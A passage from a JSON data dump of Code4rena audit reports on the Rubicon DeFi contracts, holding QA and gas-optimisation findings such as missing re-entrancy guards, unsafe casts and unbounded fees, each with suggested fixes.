    "body": "* SafeMath library is only effective with uint256 types:\n```solidity\n  using SafeMath for uint16;\n```\nAlso, uint16 does not make any sense, nor give any improvements here:\n```solidity\n  uint16 stratReward = IBathHouse(_bathHouse).getBPSToStrats();\n  function getBPSToStrats() external view returns (uint8);\n```\nConsider storing stratReward in uint256 and removing using SafeMath for uint16.\n\n* timeDelay and all the functions related to it are not used in any meaningful way. Depending on the intentions, consider either removing it or implementing it where intended.\n```solidity\n   /// @notice A variable time delay after which a strategist must return funds to the Bath Token\n    uint256 public timeDelay;\n```\n\n* BathHouse imports the same contract twice:\n```solidity\n    import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n    import \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n```\n\n* Misleading comment:\n```solidity\n    /// @notice Admin-only function to set a Bath Token's timeDelay\n    function setBathTokenMarket(address bathToken, address newMarket)\n```\n\n* From the whitepaper: \"BathTokens can be redeemed for the underlying tokens at any time\". \nHowever, there exists a reserve ratio, that is initially set to 50%, meaning not all the liquidity is available to redeem at any time. Please keep your users informed and aware of this.\n\n* From the whitepaper: FeeBPS \"The fee is currently set to zero but could change in the near future\"\n```solidity\n  feeBPS = 3; //Fee set to 3 BPS initially\n```\n\n* No need for assembly here, can get it from block.chainid:\n```solidity\n  assembly {\n    chainId := chainid()\n  }\n```\n\n* The current best practice is to use safe ERC20 library for token interactions (safeApprove and safeTransfer), e.g.:\n```solidity\n   newBathTokenUnderlying.approve(newOne, initialLiquidityNew);\n   IERC20(asset).transfer(msg.sender, booty);\n```\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/utils/SafeERC20.sol\n\n*   Consider using SafeCast library:\n```solidity\n  require(uint128(pay_amt) == pay_amt);\n  require(uint128(buy_amt) == buy_amt);\n```\nAlso, there are many unchecked casts, e.g.:\n```solidity\n  take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\n  take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\n```\nMake sure that large values will not be truncated due to explicit casting and utilize safe casts where possible.\n\n* The array of bonusTokens only grows, elements can't be removed. Consider introducing a reasonable upper limit or remove function, otherwise it may grow so large to that calls to distributeBonusTokenRewards will start reverting due to block gas limitations.\n```solidity\n    /// @notice Array of Bonus ERC-20 tokens that are given as liquidity incentives to pool withdrawers\n    address[] public bonusTokens;\n\n    /// @notice Admin-only function to add a bonus token to bonusTokens for pool incentives\n    function setBonusToken(address newBonusERC20) external onlyBathHouse {\n        bonusTokens.push(newBonusERC20);\n    }\n\n    for (uint256 index = 0; index < bonusTokens.length; index++)\n```\n\n* Lack of re-entrancy protection, e.g. function strategistBootyClaim first transfers tokens and only then updates the state. Tokens may contain transfer hooks that can be used to exploit re-entrancy. Either make sure you 100% trust the callers (usually strategists) or implement a re-entrancy guard.\n\n* In tailOff a strategist can choose any _stratUtil target. A malicious target can drain the tokens. Consider having a whitelist, at least temporary, and you can later disable it if everything goes smoothly.\n\n* Contracts use Solidity version that does not protect from overflow / underflow by default, however, there are regular math operations that could be exploited, e.g.:\n```solidity\n        uint256 askDelta = info.askPayAmt - offer1.pay_amt;\n        uint256 bidDelta = info.bidPayAmt - offer2.pay_amt;\n```\nOr:\n```solidity\n        uint256 releasable = vestedAmount(\n        address(token),\n        uint64(block.timestamp)\n    ) - released(address(token));\n    _erc20Released[address(token)] += amount;\n```\nConsider using SafeMath operations everywhere.",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/439"
    }
  },
  {
    "title": "QA Report",
    "body": "## Different pragmas\n\ncontracts under peripheral  (bathbuddy)use pragma solidity >=0.6.0 <0.8.0; while in the core contracts we have pragma solidity =0.7.6;\n\n## Natspec incomplete\nTo make the contract clearer to users and avoid some misunderstandings, it is recommended to use natspec for any public/external functions/variables in the code and tools can use that to display it to end users\n\n\nFile: Bathhouse.sol  [line 388](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L388-L394),\n\n```\n    /// @dev Low-level functionality to spawn a Bath Token using the OZ Transparent Upgradeable Proxy standard\n    /// @param underlyingERC20 The underlying ERC-20 asset that underlies the newBathTokenAddress\n    /// @param _feeAdmin Recipient of pool withdrawal fees, typically the pool itself\n    function _createBathToken(ERC20 underlyingERC20, address _feeAdmin)\n        internal\n        returns (address newBathTokenAddress)\n    {\n```\nMissing @return \n\nFile: Bathtoken.sol [line 754](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L754-L758)\n```\n    /// @notice The best-guess total claim on assets the Bath Token has\n    /// @dev returns the amount of underlying ERC20 tokens in this pool in addition to any tokens that are outstanding in the Rubicon order book seeking market-making yield (outstandingAmount)\n    function underlyingBalance() public view returns (uint256) {\n        uint256 _pool = IERC20(underlyingToken).balanceOf(address(this));\n        return _pool.add(outstandingAmount);\n```\n\nmissing @return\n\n\nFile: Bathpair.sol [line 158](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L158-L166)\n\n```\n    /// @notice This function enforces that the Bath House reserveRatio (a % of underlying pool liquidity) is enforced across all pools\n    /// @dev This function should ensure that reserveRatio % of the underlying liquidity always remains on the Bath Token. Utilization should be 1 - reserveRatio in practice assuming strategists use all available liquidity.\n    function enforceReserveRatio(\n        address underlyingAsset,\n        address underlyingQuote\n    )\n        internal\n        view\n        returns (address bathAssetAddress, address bathQuoteAddress)\n```\nMissing @param and @return\n\nFile: BathPair.sol [line 303](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L303-L308)\n\n```\n    /// @notice A function that returns the index of uid from array\n    /// @dev uid must be in array for the purposes of this contract to enforce outstanding trades per strategist are tracked correctly\n    function getIndexFromElement(uint256 uid, uint256[] storage array)\n        internal\n        view\n        returns (uint256 _index)\n```\nMissing @param and @return\n\n\nFile: BathPair.sol [line 629](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathPair.sol#L629-L638)\n\n```\n    /// @notice The goal of this function is to enable a means to retrieve all outstanding orders a strategist has live in the books\n    /// @dev This is helpful to manage orders as well as track all strategist orders (like their RAM of StratTrade IDs) and place any would-be constraints on strategists\n    function getOutstandingStrategistTrades(\n        address asset,\n        address quote,\n        address strategist\n    ) public view returns (uint256[] memory) {\n        return outOffersByStrategist[asset][quote][strategist];\n    }\n}\n```\nMissing @param and @return\n\n### Inconsistency with Natspec\nIn  [bathtoken.sol](https://github.com/code-423n4/2022-05-rubicon/blob/main/contracts/rubiconPools/BathToken.sol#L8) and most of the other contracts, natspec is used irregulary, some function have it some don't.\n\n",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/438"
    }
  },
  {
    "title": "QA Report",
    "body": "## Low\n\n### `BathToken` domain separator is fixed\n\nThe `BathToken#DOMAIN_SEPARATOR` used for EIP-2612 approvals is set permanently in the contract initializer:\n\n[`BathToken#initializer`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L195-L209)\n\n```solidity\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n```\n\nSince the domain separator includes the `chainId`, there is a risk of permit replay attacks between chains in the event of a future chain split. (See \"Security Considerations\" in the [EIP-2612 spec](https://eips.ethereum.org/EIPS/eip-2612)).\n\nRecommendation: store both `CHAIN_ID` and `DOMAIN_SEPARATOR` at contract initialization time. Read the current `chainId` in `permit` and recalculate the domain separator if it does not match the cached value.\n\n### `BathToken` admin can set `feeBPS` to 100%\n\nThe `BathToken` admin can set feeBPS to 100%, which would claim all withdrawals as fees. Additionally, a malicious admin could observe and frontrun withdrawal transactions to increase the fee value and claim additional fees.\n\n[`BathToken#setFeeBPS`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L259-L262)\n\n```solidity\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setFeeBPS(uint256 _feeBPS) external onlyBathHouse {\n        feeBPS = _feeBPS;\n    }\n```\n\nRecommendation: Set and validate an upper bound on fees. Ensure the admin account is controlled by a timelock with a reasonable delay for parameter changes to mitigate frontrunning risk.\n\n\n### `BathHouse` admin can be transferred to the zero address\n\nThe `BathHouse` `admin` can be intentionally or accidentally set to `address(0)`, which would permanently deny access to `onlyAdmin` protected functions.\n\n[`BathHouse#setBathHouseAdmin`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L252-L255)\n\n```solidity\n    /// @notice Admin-only function to set a new Admin\n    function setBathHouseAdmin(address newAdmin) external onlyAdmin {\n        admin = newAdmin;\n    }\n```\n\nSuggestion: Validate that `newAdmin` is not `address(0)` in `setBathHouseAdmin`:\n\n```solidity\n    /// @notice Admin-only function to set a new Admin\n    function setBathHouseAdmin(address newAdmin) external onlyAdmin {\n        require(newAdmin != address(0), 'Invalid admin');\n        admin = newAdmin;\n    }\n```\n\nAdditionally, consider implementing two-step ownership transfers, which are a more robust method to prevent accidental transfers.\n\n### Prefer two-step admin transfers\n\nIt the `BathHouse` `admin` accidentally transfers ownership to an incorrect address, protected functions may become permanently inaccessible.\n\n[`BathHouse#setBathHouseAdmin`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L252-L255)\n\n```solidity\n    /// @notice Admin-only function to set a new Admin\n    function setBathHouseAdmin(address newAdmin) external onlyAdmin {\n        admin = newAdmin;\n    }\n```\n\nSuggestion: handle admin changes with two steps and two transactions. First, allow the current admin to propose a new owner address. Second, allow the proposed admin (and only the proposed admin) to accept ownership, and update the contract owner internally.\n\n## Noncritical\n\n### Emit events from permissioned functions\n\nConsider adding events to protected functions that change contract state. This enables you to monitor off chain for suspicious activity, and allows end users to observe and trust changes to these parameters.\n\n-[`BathHouse#createBathToken`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L208)\n-[`BathHouse#adminWriteBathToken`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L217)\n-[`BathHouse#setBathHouseAdmin`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L253)\n-[`BathHouse#setNewBathTokenImplementation`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L259)\n-[`BathHouse#setPermissionedStrategists`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L269)\n-[`BathHouse#setCancelTimeDelay`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L274)\n-[`BathHouse#setReserveRatio`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L279)\n-[`BathHouse#setMarket`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L335)\n-[`BathToken#setMarket`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L245)\n-[`BathToken#setBathHouse`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L250)\n-[`BathToken#setFeeBPS`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L260)\n-[`BathToken#setFeeTo`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L265)\n-[`BathToken#setBonusToken`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L270)\n\n\n## QA\n\n### Remove unused implicit return value from `getExpectedSwapFill`\n\nThe implicit `fill_amt` return value in `RubiconRouter#getExpectedSwapFill` is unused. Instead, the function uses an explicit `return` on line 188.\n\n[`RubiconRouter#getExpectedSwapFill`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L159-L189)\n\n```solidity\n\n    /// @dev this function takes the same parameters of swap and returns the expected amount\n    function getExpectedSwapFill(\n        uint256 pay_amt,\n        uint256 buy_amt_min,\n        address[] calldata route, // First address is what is being payed, Last address is what is being bought\n        uint256 expectedMarketFeeBPS //20\n    ) public view returns (uint256 fill_amt) {\n        address _market = RubiconMarketAddress;\n        uint256 currentAmount = 0;\n        for (uint256 i = 0; i < route.length - 1; i++) {\n            (address input, address output) = (route[i], route[i + 1]);\n            uint256 _pay = i == 0\n                ? pay_amt\n                : (\n                    currentAmount.sub(\n                        currentAmount.mul(expectedMarketFeeBPS).div(10000)\n                    )\n                );\n            uint256 wouldBeFillAmount = RubiconMarket(_market).getBuyAmount(\n                ERC20(output),\n                ERC20(input),\n                _pay\n            );\n            currentAmount = wouldBeFillAmount;\n        }\n        require(currentAmount >= buy_amt_min, \"didnt clear buy_amt_min\");\n\n        // Return the wouldbe resulting swap amount\n        return (currentAmount);\n    }\n```\n\n### Simplify boolean checks in `isApprovedStrategist`\n\nThe logic in `BathHouse#isApprovedStrategist` can be simplified by omitting a boolean equality check and directly returning the value.\n\n[`BathHouse.sol#372`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L365-L379)\n\n```solidity\n    /// @notice A function to check whether or not an address is an approved strategist\n    function isApprovedStrategist(address wouldBeStrategist)\n        external\n        view\n        returns (bool)\n    {\n        if (\n            approvedStrategists[wouldBeStrategist] == true ||\n            !permissionedStrategists\n        ) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n```\n\nSuggestion:\n\n```solidity\n    /// @notice A function to check whether or not an address is an approved strategist\n    function isApprovedStrategist(address wouldBeStrategist)\n        external\n        view\n        returns (bool)\n    {\n        return (approvedStrategists[wouldBeStrategist] || !permissionedStrategists);\n    }\n```\n\n### Set initialized at top of initializers\n\n In the `initialize` functions for both [`BathHouse`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L128), and [`BathToken`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathToken.sol#L221), `initialized` is set to `true` at the very end of the function. In the case of `BathToken`, this value is set after making an external call to set a token approval. Consider setting initialized at the start of the initializer function, which is more consistent with checks-effects-interactions and a good defense in depth habit against potential re-entrancy.\n\n### Incorrect natspec comments\n\n`BathHouse#`setBathTokenMarket`(https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/rubiconPools/BathHouse.sol#L285-L291)\n\n```solidity\n    /// @notice Admin-only function to set a Bath Token's timeDelay\n    function setBathTokenMarket(address bathToken, address newMarket)\n        external\n        onlyAdmin\n    {\n        IBathToken(bathToken).setMarket(newMarket);\n    }\n```\n\n### Lowercase `RubiconMarketAddress`\n\nConsider using a lowercase name for the `RubiconMarketAddress` address, which is consistent with the [Solidity style guide](https://docs.soliditylang.org/en/v0.8.14/style-guide.html).\n\n[`RubiconRouter..sol#19`](https://github.com/code-423n4/2022-05-rubicon/blob/8c312a63a91193c6a192a9aab44ff980fbfd7741/contracts/RubiconRouter.sol#L19)\n\n```solidity\n    address public RubiconMarketAddress;\n```",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/435"
    }
  },
  {
    "title": "QA Report",
    "body": "- [[L-01] Missing Re-entrancy Guard / Possible re-entrancy](#l-01-missing-re-entrancy-guard--possible-re-entrancy)\n- [[L-02] Unsafe uint128 casting may overflow](#l-02-unsafe-uint128-casting-may-overflow)\n- [[L-03] Misleading comments](#l-03-misleading-comments)\n- [[L-04] Deprecated approve() function](#l-04-deprecated-approve-function)\n- [[L-05] Misleading `RubiconMarket.isClosed()` function](#l-05-misleading-rubiconmarketisclosed-function)\n- [[L-06] Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom](#l-06-use-safetransfersafetransferfrom-consistently-instead-of-transfertransferfrom)\n- [[L-07] Unbounded loop on array can lead to DoS](#l-07-unbounded-loop-on-array-can-lead-to-dos)\n- [[L-08] Fees should be upper-bounded](#l-08-fees-should-be-upper-bounded)\n- [[L-09] Add a timelock and event to critical functions](#l-09-add-a-timelock-and-event-to-critical-functions)\n- [[L-10] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`](#l-10-abiencodepacked-should-not-be-used-with-dynamic-types-when-passing-the-result-to-a-hash-function-such-as-keccak256)\n- [[L-11] `BathHouse.sol#setBathHouseAdmin()` should implement a 2-step transfer pattern](#l-11-bathhousesolsetbathhouseadmin-should-implement-a-2-step-transfer-pattern)\n\n## [L-01] Missing Re-entrancy Guard / Possible re-entrancy\n\nThe CEIP isn't respected here (see `@audit` tags for further details):\n\n```solidity\nFile: BathBuddy.sol\n087:     function release(\n088:         IERC20 token,\n089:         address recipient,\n090:         uint256 sharesWithdrawn,\n091:         uint256 initialTotalSupply,\n092:         uint256 poolFee\n093:     ) external override {\n094:         require(\n095:             msg.sender == beneficiary,\n096:             \"Caller is not the Bath Token beneficiary of these rewards\"\n097:         );\n098:         uint256 releasable = vestedAmount(\n099:             address(token),\n100:             uint64(block.timestamp)\n101:         ) - released(address(token)); //@audit \"released(address(token)\" ==  \"_erc20Released[address(token)]\" which is updated AFTER the transfer L114\n102:         if (releasable > 0) {\n...\n114:             token.transfer(recipient, amountWithdrawn); //@audit could be a malicious token or a token with a callback that people\n115: \n116:             _erc20Released[address(token)] += amount; //@audit updated post-transfer\n...\n128:     }\n```\n\nWhile unlikely to remain unseen, if we imagine a malicious ERC-20 token or a malicious ERC-777 token that has a callback to `BathBuddy.sol#release()` under conditions, it would be possible to steal from other naive people that invested / used the said token.\n\nConsider adding a re-entrancy guard and respecting the CEIP here.\n\n## [L-02] Unsafe uint128 casting may overflow\n\nSafeMath and Solidity 0.8.* handles overflows for basic math operations but not for casting.\nConsider using OpenZeppelin's SafeCast library to prevent unexpected overflows when casting from uint256 here:\n\n```solidity\nperipheral_contracts/BathBuddy.sol:100:            uint64(block.timestamp)\nperipheral_contracts/VestingWallet.sol:93:        uint256 releasable = vestedAmount(uint64(block.timestamp)) - released();\nperipheral_contracts/VestingWallet.sol:105:        uint256 releasable = vestedAmount(token, uint64(block.timestamp)) -\nRubiconMarket.sol:264:            uint128(offers[id].pay_amt),\nRubiconMarket.sol:265:            uint128(offers[id].buy_amt),\nRubiconMarket.sol:282:        require(uint128(spend) == spend, \"spend is not an int\");\nRubiconMarket.sol:283:        require(uint128(quantity) == quantity, \"quantity is not an int\");\nRubiconMarket.sol:321:            uint128(quantity),\nRubiconMarket.sol:322:            uint128(spend),\nRubiconMarket.sol:323:            uint64(block.timestamp)\nRubiconMarket.sol:332:            uint64(block.timestamp)\nRubiconMarket.sol:370:            uint128(_offer.pay_amt),\nRubiconMarket.sol:371:            uint128(_offer.buy_amt),\nRubiconMarket.sol:372:            uint64(block.timestamp)\nRubiconMarket.sol:398:        require(uint128(pay_amt) == pay_amt);\nRubiconMarket.sol:399:        require(uint128(buy_amt) == buy_amt);\nRubiconMarket.sol:412:        info.timestamp = uint64(block.timestamp);\nRubiconMarket.sol:425:            uint128(pay_amt),\nRubiconMarket.sol:426:            uint128(buy_amt),\nRubiconMarket.sol:427:            uint64(block.timestamp)\nRubiconMarket.sol:476:        return uint64(block.timestamp);\nRubiconMarket.sol:853:                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\nRubiconMarket.sol:861:                take(bytes32(offerId), uint128(baux)); //We take the portion of the offer that we need\nRubiconMarket.sol:892:                take(bytes32(offerId), uint128(offers[offerId].pay_amt)); //We take the whole offer\nRubiconMarket.sol:902:                take(bytes32(offerId), uint128(buy_amt)); //We take the portion of the offer that we need\n```\n\nDocumentation: <https://docs.openzeppelin.com/contracts/3.x/api/utils#SafeCast>\n\n## [L-03] Misleading comments\n\nThe following revert string doesn't match with the condition:\n\n```solidity\nFile: RubiconMarket.sol\n572:         require(\n573:             isClosed() || msg.sender == getOwner(id) || id == dustId,\n574:             \"Offer can not be cancelled because user is not owner, and market is open, and offer sells required amount of tokens.\" //@audit should say \"or\"\n575:         );\n```\n\n## [L-04] Deprecated approve() function\n\n`approve` which is subject to a known front-running attack and failing for certain token implementations that do not return a boolean value. Consider using `safeApprove` instead (or better: `safeIncreaseAllowance()`/`safeDecreaseAllowance()`):\n\n```solidity\ncontracts/RubiconRouter.sol:\n  157:         ERC20(toApprove).approve(RubiconMarketAddress, 2**256 - 1);\n  465:             target.approve(targetPool, amount);\n\ncontracts/rubiconPools/BathHouse.sol:\n  165:         newBathTokenUnderlying.approve(newOne, initialLiquidityNew);\n  180:         desiredPairedAsset.approve(\n  323:         IBathToken(targetBathToken).approveMarket();\n\ncontracts/rubiconPools/BathToken.sol:\n  214:         IERC20(address(token)).approve(RubiconMarketAddress, 2**256 - 1);\n  256:         underlyingToken.approve(RubiconMarketAddress, 2**256 - 1);\n```\n\n## [L-05] Misleading `RubiconMarket.isClosed()` function\n\nThis function is a constant that never changes:\n\n```solidity\nFile: RubiconMarket.sol\n471:     function isClosed() public pure returns (bool closed) {\n472:         return false;//@audit ??? Uninmplemented\n473:     }\n```\n\nSee its occurrences in require statements:\n\n```solidity\ncontracts/RubiconMarket.sol:\n  453:         require(!isClosed());\n  460:         require(!isClosed());\n  467:         require((msg.sender == getOwner(id)) || isClosed());\n```\n\n## [L-06] Use safeTransfer/safeTransferFrom consistently instead of transfer/transferFrom\n\nIt is good to add a require() statement that checks the return value of token transfers or to use something like OpenZeppelin’s safeTransfer/safeTransferFrom unless one is sure the given token reverts in case of a failure. Failure to do so will cause silent failures of transfers and affect token accounting in contract.\n\nReference: This similar medium-severity finding from Consensys Diligence Audit of Fei Protocol: <https://consensys.net/diligence/audits/2021/01/fei-protocol/#unchecked-return-value-for-iweth-transfer-call>\n\nConsider using safeTransfer/safeTransferFrom or require() consistently:\n\n```solidity\ncontracts/rubiconPools/BathToken.sol:\n  565:         underlyingToken.transferFrom(msg.sender, address(this), assets);\n  602:             underlyingToken.transfer(feeTo, _fee);\n  605:         underlyingToken.transfer(receiver, amountWithdrawn);\n```\n\n## [L-07] Unbounded loop on array can lead to DoS\n\nAs this array can grow quite large (only `push` operations, no `pop`), the transaction's gas cost could exceed the block gas limit and make it impossible to call this function at all.\n\n```solidity\ncontracts/rubiconPools/BathToken.sol:\n  271:         bonusTokens.push(newBonusERC20);\n  635:             for (uint256 index = 0; index < bonusTokens.length; index++) {\n```\n\nConsider introducing a reasonable upper limit based on block gas limits and adding a method to remove elements in the array.\n\n## [L-08] Fees should be upper-bounded\n\n- File: BathToken.sol\n\n```solidity\n260:     function setFeeBPS(uint256 _feeBPS) external onlyBathHouse { //@audit onlyBathHouse should be timelocked\n261:         feeBPS = _feeBPS;\n262:     }\n```\n\n- File: BathHouse.sol\n\n```solidity\n310:     function setBathTokenFeeBPS(address bathToken, uint256 newBPS)\n311:         external\n312:         onlyAdmin\n313:     {\n314:         IBathToken(bathToken).setFeeBPS(newBPS); //@audit \"EOA\" not enough, need timelock\n315:     }\n```\n\n- File: RubiconMarket.sol\n\n```solidity\n1231:     function setFeeBPS(uint256 _newFeeBPS) external auth returns (bool) {\n1232:         feeBPS = _newFeeBPS; //@audit low: auth should be put behind timelock + this should be upper bounded\n1233:         return true;\n1234:     }\n```\n\n## [L-09] Add a timelock and event to critical functions\n\nIt is a good practice to give time for users to react and adjust to critical changes. A timelock provides more guarantees and reduces the level of trust required, thus decreasing risk for users. It also indicates that the project is legitimate (less risk of a malicious owner making a sandwich attack on a user).  \n\nConsider adding a timelock and event to `onlyBathHouse`, `onlyAdmin` and `auth`\n\n## [L-10] `abi.encodePacked()` should not be used with dynamic types when passing the result to a hash function such as `keccak256()`\n\nUse `abi.encode()` instead which will pad items to 32 bytes, which will prevent hash collisions (e.g. `abi.encodePacked(0x123,0x456)` => `0x123456` => `abi.encodePacked(0x1,0x23456)`, but `abi.encode(0x123,0x456)` => `0x0...1230...456`).\n\n```solidity\nFile: BathToken.sol\n723:         bytes32 digest = keccak256(\n724:             abi.encodePacked(\n725:                 \"\\x19\\x01\",\n726:                 DOMAIN_SEPARATOR,\n727:                 keccak256(\n728:                     abi.encode(\n729:                         PERMIT_TYPEHASH,\n730:                         owner,\n731:                         spender,\n732:                         value,\n733:                         nonces[owner]++,\n734:                         deadline\n735:                     )\n736:                 )\n737:             )\n738:         );\n```\n\n## [L-11] `BathHouse.sol#setBathHouseAdmin()` should implement a 2-step transfer pattern\n\n```solidity\nFile: BathHouse.sol\n253:     function setBathHouseAdmin(address newAdmin) external onlyAdmin {\n254:         admin = newAdmin; //@audit low: should be 2 step\n255:     }\n```\n",
    "dataSource": {
      "name": "code-423n4/2022-05-rubicon-findings",
      "repo": "https://github.com/code-423n4/2022-05-rubicon-findings",
      "url": "https://github.com/code-423n4/2022-05-rubicon-findings/issues/424"
    }
  },
  {
    "title": "Gas Optimizations",
    "body": "# Gas Optimizations Report\n\n## For-Loops: Cache array length outside of loops\nReading an array length at each iteration of the loop takes 6 gas (3 for `mload` and 3 to place `memory_offset`) in the stack.\n\nCaching the array length in the stack saves around 3 gas per iteration. \n\nFor example:\n```js\nfor (uint256 i; i < arr.length; ++i) {}\n```\ncan be changed to:\n```js\nuint256 len = arr.length;\nfor (uint256 i; i < len; ++i) {}\n```\n\nConsider making the following change to these lines:  \n```js\ncontracts/rubiconPools/BathToken.sol:\n 635:        for (uint256 index = 0; index < bonusTokens.length; index++) {\n\ncontracts/rubiconPools/BathPair.sol:\n 311:        for (uint256 index = 0; index < array.length; index++) {\n 582:        for (uint256 index = 0; index < ids.length; index++) {\n```\n\n## For-Loops: Index increments can be left unchecked\nFrom Solidity v0.8 onwards, all arithmetic operations come with implicit overflow and underflow checks. \n\nIn for-loops, as it is impossible for the index to overflow, it can be left unchecked to save gas every iteration. \n\nFor example, the code below:\n```js\nfor (uint256 i; i < numIterations; ++i) {  \n    // ...  \n}  \n```\ncan be changed to:\n```js\nfor (uint256 i; i < numIterations;) {  \n    // ...  \n    unchecked { ++i; }  \n}  \n```\n\nConsider making the following change to these lines:  \n```js\ncontracts/RubiconRouter.sol:\n  85:        for (uint256 index = 0; index < topNOrders; index++) {\n 169:        for (uint256 i = 0; i < route.length - 1; i++) {\n 227:        for (uint256 i = 0; i < route.length - 1; i++) {\n\ncontracts/rubiconPools/BathToken.sol:\n 635:        for (uint256 index = 0; index < bonusTokens.length; index++) {\n\ncontracts/rubiconPools/BathPair.sol:\n 311:        for (uint256 index = 0; index < array.length; index++) {\n 427:        for (uint256 index = 0; index < quantity; index++) {\n 480:        for (uint256 index = 0; index < quantity; index++) {\n 582:        for (uint256 index = 0; index < ids.length; index++) {\n```\n\n## Arithmetics: `++i` costs less gas compared to `i++` or `i += 1`\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integers, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:\n```js\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\nBut `++i` returns the actual incremented value:\n```js\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n\nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`, thus it costs more gas.\n\nThe same logic applies for `--i` and `i--`.\n\nConsider using `++i` instead of `i++` or `i += 1` in the following instances:  \n```js\ncontracts/RubiconRouter.sol:\n  85:        for (uint256 index = 0; index < topNOrders; index++) {\n 169:        for (uint256 i = 0; i < route.length - 1; i++) {\n 227:        for (uint256 i = 0; i < route.length - 1; i++) {\n\ncontracts/RubiconMarket.sol:\n 436:        last_offer_id++;\n\ncontracts/peripheral_contracts/WETH9.sol:\n 109:        share and change all versions of a program--to make sure it remains free\n\ncontracts/rubiconPools/BathToken.sol:\n 635:        for (uint256 index = 0; index < 